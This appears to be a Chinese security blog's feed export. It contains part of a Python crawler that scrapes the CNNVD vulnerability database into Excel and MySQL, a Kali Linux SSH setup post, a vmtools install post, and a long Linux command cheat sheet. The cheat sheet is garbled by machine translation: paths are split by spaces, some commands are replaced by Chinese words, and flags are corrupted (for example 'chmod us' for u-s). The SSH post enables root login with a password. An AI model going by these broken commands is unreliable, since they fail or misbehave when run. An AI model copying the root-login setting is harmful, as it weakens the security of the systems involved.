class="number">14</span>,<span class="string">'补丁'</span>)</span><br><span class="line"></span><br><span class="line">    row = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(excel)):</span><br><span class="line">        worksheet.write(row,col,excel[i][<span class="number">0</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">1</span>,excel[i][<span class="number">1</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">2</span>,excel[i][<span class="number">2</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">3</span>,excel[i][<span class="number">3</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">4</span>,excel[i][<span class="number">4</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">5</span>,excel[i][<span class="number">5</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">6</span>,excel[i][<span class="number">6</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">7</span>,excel[i][<span class="number">7</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">8</span>,excel[i][<span class="number">8</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">9</span>,excel[i][<span class="number">9</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">10</span>,excel[i][<span class="number">10</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">11</span>,excel[i][<span class="number">11</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">12</span>,excel[i][<span class="number">12</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">13</span>,excel[i][<span class="number">13</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">14</span>,excel[i][<span class="number">14</span>])</span><br><span class="line">        row += <span class="number">1</span></span><br><span class="line">    workbook.close()</span><br><span class="line"></span><br><span class="line"><span class="comment">#漏洞信息写入数据库</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vulnerabilities_mysql</span><span class="params">(excel)</span>:</span></span><br><span class="line">    db = pymysql.connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'xxxx'</span>,<span class="string">'spider'</span>,charset=<span class="string">'utf8'</span>)</span><br><span class="line">    cursor = db.cursor()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(excel)):</span><br><span class="line">        sql=<span class="string">"INSERT INTO cnnvd(vulnerabilities_name,cnnvd_num,vulnerabilities_rank,cve_num,vulnerabilities_type,release_time,attack_path,update_time,company,vulnerabilities_source,vulnerabilities_data,solution,reference,object,path) VALUES(%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s);"</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cursor.execute(sql,(excel[i][<span class="number">0</span>],excel[i][<span class="number">1</span>],excel[i][<span class="number">2</span>],excel[i][<span class="number">3</span>],excel[i][<span class="number">4</span>],excel[i][<span class="number">5</span>],excel[i][<span class="number">6</span>],excel[i][<span class="number">7</span>],excel[i][<span class="number">8</span>],excel[i][<span class="number">9</span>],excel[i][<span class="number">10</span>],excel[i][<span class="number">11</span>],excel[i][<span class="number">12</span>],excel[i][<span class="number">13</span>],excel[i][<span class="number">14</span>]))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'写入数据库失败'</span>)</span><br><span class="line">    print(<span class="string">'写入数据库完毕！！！'</span>)</span><br><span class="line">    db.commit()</span><br><span class="line">    db.close()</span><br><span class="line"></span><br><span class="line"><span class="comment">#爬取代理ip</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#调用漏洞列表函数并获得漏洞链接列表</span></span><br><span class="line">    begin = datetime.datetime.now()</span><br><span class="line">    <span class="keyword">global</span> vulnerabilities_lists</span><br><span class="line">    vulnerabilities_lists=[]</span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    page_count = sys.argv[<span class="number">3</span>]</span><br><span class="line">    page_count = int(page_count) </span><br><span class="line">    start_time = sys.argv[<span class="number">1</span>]</span><br><span class="line">    end_time = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">while</span> j&lt;=page_count:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            vulnerabilities_url = <span class="string">'http://cnnvd.org.cn/web/vulnerability/queryLds.tag?pageno=%d&amp;repairLd='</span>%j</span><br><span class="line">            vulnerabilities_url_list(vulnerabilities_url,start_time,end_time)</span><br><span class="line">            print(<span class="string">"已完成爬行第%d页"</span>%j)</span><br><span class="line">            print(<span class="string">'\n'</span>)</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">            j+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'爬取失败，等待5秒后重新爬取。'</span>)</span><br><span class="line">            time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#调用漏洞信息函数并爬取漏洞信息</span></span><br><span class="line">    vulnerabilities_result_lists = []    </span><br><span class="line">    a=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> a &lt; len(vulnerabilities_lists):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            vulnerabilities_data(vulnerabilities_lists[a])</span><br><span class="line">            vulnerabilities_result_lists.append(vulnerabilities_result_list)</span><br><span class="line">            a+=<span class="number">1</span></span><br><span class="line">            print(<span class="string">"完成爬行第%d个漏洞信息"</span>%a)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'爬取失败，等待5秒后重新爬取。'</span>)</span><br><span class="line">            time.sleep(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#漏洞信息写入excel</span></span><br><span class="line">    vulnerabilities_excel(vulnerabilities_result_lists)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#漏洞信息写入MySQL</span></span><br><span class="line">    <span class="comment">#vulnerabilities_mysql(vulnerabilities_result_lists)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#爬行结束</span></span><br><span class="line">    end = datetime.datetime.now()</span><br><span class="line">    total_time = end - begin</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'漏洞信息爬取结束'</span>)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'应该爬行漏洞数量： '</span>,len(vulnerabilities_lists))</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'爬行时间： '</span>,total_time)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>将代码保存为<code>CNNVD_crawl.py</code>,然后按<code>win + R</code> 输入<code>cmd</code>,切换到该文件的保存路径</p><h2 id="1-2-安装第三方模块"><a href="#1-2-安装第三方模块" class="headerlink" title="1.2 安装第三方模块"></a>1.2 安装第三方模块</h2><p>在运行的过程中需要第三方模块的支持，所以需要安装第三方模块，使用命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python - m pip install 第三方模块名称</span><br></pre></td></tr></table></figure><h1 id="0x02-使用教程"><a href="#0x02-使用教程" class="headerlink" title="0x02 使用教程"></a>0x02 使用教程</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python cnnvd_crawl.py <span class="number">2019</span><span class="number">-08</span><span class="number">-26</span> <span class="number">2019</span><span class="number">-08</span><span class="number">-28</span> <span class="number">26</span></span><br></pre></td></tr></table></figure><p>参数说明：</p><p><code>cnnvd_crawl.py</code>: 为脚本文件</p><p><code>2019-08-26 2019-08-28</code>：需要爬取的时间范围（需要自行在CNNVD上查看对应日期范围的总页数），中间有空格</p><p><code>26</code> : 需要爬行的页数（需要自行在CNNVD上查看对应日期范围的总页数）</p><p>示例截图：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190830170647.png" class="lozad"></p><p>自动生成生成的Excel表格</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190830170738.png" class="lozad"></p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>在这里谈一下脚本的优势和劣势吧</p><p>脚本优势：可以指定日期范围漏洞的爬行，真心强大</p><p>脚本劣势：爬虫爬行时，会有部分遗漏信息，所以需要在爬行完成后再手动的添加；爬虫爬行的速度不是很快，不是多线程的.</p><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://www.cnblogs.com/kaiho/p/7804542.html" target="_blank" rel="noopener">https://www.cnblogs.com/kaiho/p/7804542.html</a></p><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;由于公司原因，本人出差一周，在出差的工作任务有记录CNNVD漏洞预警这项任务，而这样任务简直就是重复造轮子的任务，Ctrl + C ，Ctrl + V ，毫无技术含量不说，还会浪费很多时间，so，我想用爬虫来解决，但是，我又不会写，哈哈，那就百度喽。幸运的是，在百度上找到了爬虫的源码。&lt;/p&gt;
&lt;p&gt;&lt;img alt data-src=&quot;https://img02.sogoucdn.com/app/a/100520093/e18d20c94006dfe0-2857e2f09ca9e0a0-a458d10c6b7a1d65b27c80fba9904fa9.jpg&quot; class=&quot;lozad&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="安全工具" scheme="https://www.mad-coding.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="python" scheme="https://www.mad-coding.cn/tags/python/"/>
    
      <category term="爬虫" scheme="https://www.mad-coding.cn/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>ssh连接不上kali问题</title>
    <link href="https://www.mad-coding.cn/2019/08/27/ssh%E8%BF%9E%E6%8E%A5%E4%B8%8D%E4%B8%8Akali%E9%97%AE%E9%A2%98/"/>
    <id>https://www.mad-coding.cn/2019/08/27/ssh连接不上kali问题/</id>
    <published>2019-08-27T15:25:14.000Z</published>
    <updated>2019-08-27T15:37:45.883Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>很多人在虚拟机中安装kali Linux，但是可能由于自己电脑配置的问题，导致使用起来非常的卡顿，所以想用xshell这样的远程终端工具来连接kali Linux。但是问题来了，怎么连接都连接不上，ip地址，用户名和密码什么的都配置正确，so，那可能就是配置的问题了。具体方法，请看下文。</p><a id="more"></a><h1 id="0x01-修改跟新源"><a href="#0x01-修改跟新源" class="headerlink" title="0x01 修改跟新源"></a>0x01 修改跟新源</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list <span class="comment">#使用vim编辑器修改</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leafpad /etc/apt/sources.list <span class="comment">#使用可视化编辑器修改（好用）</span></span><br></pre></td></tr></table></figure><p>跟新源</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#中科大</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"> </span><br><span class="line"><span class="comment">#阿里云</span></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"> </span><br><span class="line"><span class="comment">#清华大学</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"> </span><br><span class="line"><span class="comment">#浙大</span></span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"> </span><br><span class="line"><span class="comment">#东软大学</span></span><br><span class="line">deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line"> </span><br><span class="line"><span class="comment">#官方源</span></span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"> </span><br><span class="line"><span class="comment">#重庆大学</span></span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><p>保存关闭，<code>vim</code>需要按<code>ESC</code>键，然后按<code>hift+ :</code>，输入<code>wq</code>，保存并退出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure><h1 id="0x02-开启-ssh"><a href="#0x02-开启-ssh" class="headerlink" title="0x02 开启**ssh**"></a>0x02 <strong>开启**</strong>ssh**</h1><ol><li><p>修改sshd_config文件，命令为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line"><span class="comment">#或</span></span><br><span class="line">leafpad /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure></li><li><p>将<code>#PasswordAuthentication no</code>的注释去掉，并且将<code>NO</code>修改为<code>YES</code> (kali中默认是yes)</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190827233510.png" class="lozad"></p></li><li><p>将<code>PermitRootLogin without-password</code>修改为<code>PermitRootLogin yes</code></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190827233532.png" class="lozad"></p></li><li><p>启动ssh服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service ssh start</span><br></pre></td></tr></table></figure></li><li><p>如果还是不能链接，重启就可以了</p></li></ol><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;很多人在虚拟机中安装kali Linux，但是可能由于自己电脑配置的问题，导致使用起来非常的卡顿，所以想用xshell这样的远程终端工具来连接kali Linux。但是问题来了，怎么连接都连接不上，ip地址，用户名和密码什么的都配置正确，so，那可能就是配置的问题了。具体方法，请看下文。&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://www.mad-coding.cn/categories/Linux/"/>
    
    
      <category term="kali Linux" scheme="https://www.mad-coding.cn/tags/kali-Linux/"/>
    
  </entry>
  
  <entry>
    <title>kali Linux在安装vmtool时碰到的问题</title>
    <link href="https://www.mad-coding.cn/2019/08/27/%E5%9C%A8%E5%AE%89%E8%A3%85vmtool%E6%97%B6%E7%A2%B0%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <id>https://www.mad-coding.cn/2019/08/27/在安装vmtool时碰到的问题/</id>
    <published>2019-08-27T15:11:46.000Z</published>
    <updated>2019-08-27T15:24:52.701Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在kali Linux跟新到2018.2版本以后，使用虚拟机自带的vmtool进行安装</p><p>已经没有效果了，不能是屏幕适应客户端和拖拽操作，为此在网上搜了很多相关</p><p>的文档，最终找到了open-vm-tools-desktop 这个软件，下面来详细的介绍该</p><p>软件的安装</p><a id="more"></a><h1 id="0x01-配置跟新源"><a href="#0x01-配置跟新源" class="headerlink" title="0x01 配置跟新源"></a>0x01 配置跟新源</h1><p>在终端中输入：leafpad<br>/etc/apt/sources.list,然后添加以下跟新源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#中科大跟新源</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free</span><br><span class="line"> </span><br><span class="line">#阿里云跟新源</span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb http://mirrors.aliyun.com/kali-security kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure><h1 id="0x02-跟新系统"><a href="#0x02-跟新系统" class="headerlink" title="0x02 跟新系统"></a>0x02 跟新系统</h1><p>终端输入 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update <span class="comment">#跟新系统</span></span><br><span class="line">apt-get dist-upgrade <span class="comment">#跟新软件 （可自己选择操作）</span></span><br></pre></td></tr></table></figure><h1 id="0x03-安装vmtool"><a href="#0x03-安装vmtool" class="headerlink" title="0x03 安装vmtool"></a>0x03 安装vmtool</h1><p>终端输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install open-vm-tools-desktop fuse</span><br></pre></td></tr></table></figure><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>在安装vmtools这个问题上，上网百度了好久，但是没有相关的信息，最后在一个论坛中看到了，没想到还真解决了，一条命令解决问题，真是太爽了，比传统的安装方式还要方便。总之，碰到问题以后多从百度，Google中搜集相关的信息，一般情况下，你碰到的问题都会有人碰到过，这样你就可以直接使用别人的间接经验了，不过也要有选择性的，现在的互联网时代，数据大爆炸，很多时候因为一个复制粘贴别人文章的文章而踩大坑，本人也最讨厌这种直接复制别人的文章还不注明出处的人，导致看文章的人走弯路。emmm，ok，就这样结束~</p><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在kali Linux跟新到2018.2版本以后，使用虚拟机自带的vmtool进行安装&lt;/p&gt;
&lt;p&gt;已经没有效果了，不能是屏幕适应客户端和拖拽操作，为此在网上搜了很多相关&lt;/p&gt;
&lt;p&gt;的文档，最终找到了open-vm-tools-desktop 这个软件，下面来详细的介绍该&lt;/p&gt;
&lt;p&gt;软件的安装&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://www.mad-coding.cn/categories/Linux/"/>
    
    
      <category term="kali Linux" scheme="https://www.mad-coding.cn/tags/kali-Linux/"/>
    
  </entry>
  
  <entry>
    <title>史上最全的Linux的常用命令</title>
    <link href="https://www.mad-coding.cn/2019/08/27/%E5%8F%B2%E4%B8%8A%E6%9C%80%E5%85%A8%E7%9A%84Linux%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>https://www.mad-coding.cn/2019/08/27/史上最全的Linux的常用命令/</id>
    <published>2019-08-27T14:07:44.000Z</published>
    <updated>2019-08-27T15:41:54.593Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文涵盖了Linux系统的很多命令，为了方便以后查找使用，在这里记录一下。</p><p>内容均从网上摘抄。</p><a id="more"></a><h1 id="0x01-系统信息"><a href="#0x01-系统信息" class="headerlink" title="0x01 系统信息"></a>0x01 系统信息</h1><p>arch显示机器的处理器架构（1）</p><p>uname -m显示机器的处理器架构（2）</p><p>uname -r显示正在使用的内核版本</p><p>dmidecode -q显示硬件系统部件 - （SMBIOS / DMI）</p><p>hdparm -i / dev / hda罗列一个磁盘的架构特性</p><p>hdparm -tT / dev / sda在磁盘上执行测试性读取操作</p><p>cat / proc / cpuinfo显示CPU信息的信息</p><p>cat / proc / interrupts显示中断</p><p>cat / proc / meminfo校验内存使用</p><p>cat / proc / swaps显示哪些swap被使用</p><p>cat / proc / version显示内核的版本</p><p>cat / proc / net / dev显示网络适配器及统计</p><p>cat / proc / mounts显示已加载的文件系统</p><p>lspci -tv罗列PCI设备</p><p>lsusb -tv显示USB设备</p><p>日期显示系统日期</p><p>cal 2007显示2007年的日历表</p><p>date 041217002007.00设置日期和时间 - 月日时分年。秒</p><p>clock -w将时间修改保存到BIOS</p><p>关系（系统的关机，重启以及登出）</p><p>shutdown -h now关闭系统（1）</p><p>init 0关闭系统（2）</p><p>telinit 0关闭系统（3）</p><p>shutdown -h hours：minutes＆按预定时间关闭系统</p><p>shutdown -c取消按预定时间关闭系统</p><p>shutdown -r now重启（1）</p><p>reboot重启（2）</p><p>注销注销</p><h1 id="0x02-文件和目录"><a href="#0x02-文件和目录" class="headerlink" title="0x02 文件和目录"></a>0x02 <strong>文件和目录</strong></h1><p>cd / home进入’/ home’目录’</p><p>cd ..返回上一级目录</p><p>cd ../ ..返回上两级目录</p><p>cd进入个人的主目录</p><p>cd~user1进入个人的主目录</p><p>cd - 返回上次所在的目录</p><p>pwd显示工作路径</p><p>ls查看目录中的文件</p><p>ls -F查看目录中的文件</p><p>ls -l显示文件和目录的详细资料</p><p>ls -a显示隐藏文件</p><p>ls * [0-9] *显示包含数字的文件名和目录名</p><p>tree显示文件和目录由根目录开始的树形结构（1）</p><p>lstree显示文件和目录由根目录开始的树形结构（2）</p><p>mkdir dir1创建一个叫做’dir1’的目录’</p><p>mkdir dir1 dir2同时创建两个目录</p><p>mkdir -p / tmp / dir1 / dir2创建一个目录树</p><p>rm -f file1删除一个叫做’file1’的文件’</p><p>rmdir dir1删除一个叫做’dir1’的目录’</p><p>rm -rf dir1删除一个叫做’dir1’的目录并同时删除其内容</p><p>rm -rf dir1 dir2同时删除两个目录及它们的内容</p><p>mv dir1 new_dir重命名/移动一个目录</p><p>cp file1 file2复制一个文件</p><p>cp目录/ *。复制一个目录下的所有文件到当前工作目录</p><p>cp -a / tmp / dir1。复制一个目录到当前工作目录</p><p>cp -a dir1 dir2复制一个目录</p><p>ln -s file1 lnk1创建一个指向文件或目录的软链接</p><p>ln file1 lnk1创建一个指向文件或目录的物理链接</p><p>touch -t 0712250000 file1修改一个文件或目录的时间戳 - （YYMMDDhhmm）</p><p>file file1将文件的mime类型输出为文本</p><p>iconv -l列出已知的编码</p><p>iconv -f fromEncoding -t toEncoding inputFile&gt; outputFile通过假设它在fromEncoding中编码并将其转换为toEncoding，从给定的输入文件创建一个新的。</p><p>找 。-maxdepth 1 -name * .jpg -print -exec convert“{}”-resize 80x60“thumbs / {}”; 批量调整当前目录中的文件大小并将它们发送到缩略图目录（需要从Imagemagick转换）</p><h1 id="0x03-文件搜索"><a href="#0x03-文件搜索" class="headerlink" title="0x03 文件搜索"></a>0x03 <strong>文件搜索</strong></h1><p>find / -name file1从’/‘开始进入根文件系统搜索文件和目录</p><p>find / -user user1搜索属于用户’user1’的文件和目录</p><p>find / home / user1 -name \ * .bin在目录’/ home / user1’中搜索带有’.bin’结尾的文件</p><p>find / usr / bin -type f -atime +100搜索在过去100天内未被使用过的的执行文件</p><p>find / usr / bin -type f -mtime -10搜索在10天内被创建或者修改过的文件</p><p>find / -name \ * .rpm -exec chmod 755’{}’; 搜索以’.rpm’结尾的文件并定义其权限</p><p>find / -xdev -name \ * .rpm搜索以’.rpm’结尾的文件，忽略光驱，捷盘等可移动设备</p><p>找到\ * .ps寻找以’.ps’结尾的文件 - 先运行’updatedb’命令</p><p>whereis halt显示一个二进制文件，源码或man的位置</p><p>停止显示一个二进制文件或可执行文件的完整路径</p><h1 id="0x04-挂载一个文件系统"><a href="#0x04-挂载一个文件系统" class="headerlink" title="0x04 挂载一个文件系统"></a>0x04 <strong>挂载一个文件系统</strong></h1><p>mount / dev / hda2 / mnt / hda2挂载一个叫做hda2的盘 - 确定目录’/ mnt / hda2’已经存在</p><p>umount / dev / hda2卸载一个叫做hda2的盘 - 先从挂载点’/ mnt / hda2’退出</p><p>fuser -km / mnt / hda2当设备繁忙时强制卸载</p><p>umount -n / mnt / hda2运行卸载操作而不写入/ etc / mtab文件 - 当文件为只读或当磁盘写满时非常有用</p><p>mount / dev / fd0 / mnt / floppy挂载一个软盘</p><p>mount / dev / cdrom / mnt / cdrom挂载一个cdrom或dvdrom</p><p>mount / dev / hdc / mnt / cdrecorder挂载一个cdrw或dvdrom</p><p>mount / dev / hdb / mnt / cdrecorder挂载一个cdrw或dvdrom</p><p>mount -o loop file.iso / mnt / cdrom挂载一个文件或ISO镜像文件</p><p>mount -t vfat / dev / hda5 / mnt / hda5挂载一个Windows FAT32文件系统</p><p>mount / dev / sda1 / mnt / usbdisk挂载一个usb捷盘或闪存设备</p><p>mount -t smbfs -o username = user，password = pass // WinClient / share / mnt / share挂载一个windows网络共享</p><h1 id="0x05-磁盘空间"><a href="#0x05-磁盘空间" class="headerlink" title="0x05 磁盘空间"></a>0x05 <strong>磁盘空间</strong></h1><p>df -h显示已经挂载的分区列表</p><p>ls -lSr | more以尺寸大小排列文件和目录</p><p>du -sh dir1估算目录’dir1’已经使用的磁盘空间’</p><p>du -sk * | sort -rn以容量大小为依据依次显示文件和目录的大小</p><p>rpm -q -a –qf’％10 {SIZE} t％{NAME} n’| sort -k1,1n以大小为依据依次显示已安装的rpm包所使用的空间（fedora，redhat类系统）</p><p>dpkg-query -W -f =’$ {Installed-Size; 10} t $ {Package} n’| sort -k1,1n以大小为依据显示已安装的deb包所使用的空间（ubuntu，debian类系统）</p><h1 id="0x06-用户和群组"><a href="#0x06-用户和群组" class="headerlink" title="0x06 用户和群组"></a>0x06 用户和群组</h1><p>groupadd group_name创建一个新用户组</p><p>groupdel group_name删除一个用户组</p><p>groupmod -n new_group_name old_group_name重命名一个用户组</p><p>useradd -c“名字姓氏”-g admin -d / home / user1 -s / bin / bash user1创建一个属于“admin”用户组的用户</p><p>useradd user1创建一个新用户</p><p>userdel -r user1删除一个用户（’-r’排除主目录）</p><p>usermod -c“用户FTP”-g system -d / ftp / user1 -s / bin / nologin user1修改用户属性</p><p>passwd修改口令</p><p>passwd user1修改一个用户的口令（只允许root执行）</p><p>chage -E 2005-12-31 user1设置用户口令的失效期限</p><p>pwck检查’/ etc / passwd’的文件格式和语法修正以及存在的用户</p><p>grpck检查’/ etc / passwd’的文件格式和语法修正以及存在的群组</p><p>newgrp group_name登陆进一个新的群组以改变新创建文件的预设群组</p><h1 id="0x07-文件的权限"><a href="#0x07-文件的权限" class="headerlink" title="0x07 文件的权限"></a>0x07 文件的权限</h1><blockquote><p>使用“+”设置权限，使用“ - ”用于取消</p></blockquote><p>ls -lh显示权限</p><p>ls / tmp | pr -T5 -W $ COLUMNS将终端划分成5栏显示</p><p>chmod ugo + rwx directory1设置目录的所有人（u），群组（g）以及其他人（o）以读（r），写（w）和执行（x）的权限</p><p>chmod go-rwx directory1删除群组（g）与其他人（o）对目录的读写执行权限</p><p>chown user1 file1改变一个文件的所有人属性</p><p>chown -R user1 directory1改变一个目录的所有人属性并同时改变改目录下所述文件的属性</p><p>chgrp group1 file1改变文件的群组</p><p>chown user1：group1 file1改变一个文件的所有人和群组属性</p><p>find / -perm -u + s罗列一个系统中所有使用了SUID控制的文件</p><p>chmod u + s / bin / file1设置一个二进制文件的SUID位 - 运行该文件的用户也被赋予和所有者同样的权限</p><p>chmod us / bin / file1禁用一个二进制文件的SUID位</p><p>chmod g + s / home / public设置一个目录的SGID位 - 类似SUID，不过这是针对目录的</p><p>chmod gs / home / public禁用一个目录的SGID位</p><p>chmod o + t / home / public设置一个文件的STIKY位 - 只允许合法所有人删除文件</p><p>chmod ot / home / public禁用一个目录的STIKY位</p><h1 id="0x08-文件的特殊属性"><a href="#0x08-文件的特殊属性" class="headerlink" title="0x08 文件的特殊属性"></a>0x08 文件的特殊属性</h1><blockquote><p>使用“+”设置权限，使用“ - ”用于取消</p></blockquote><p>chattr + a 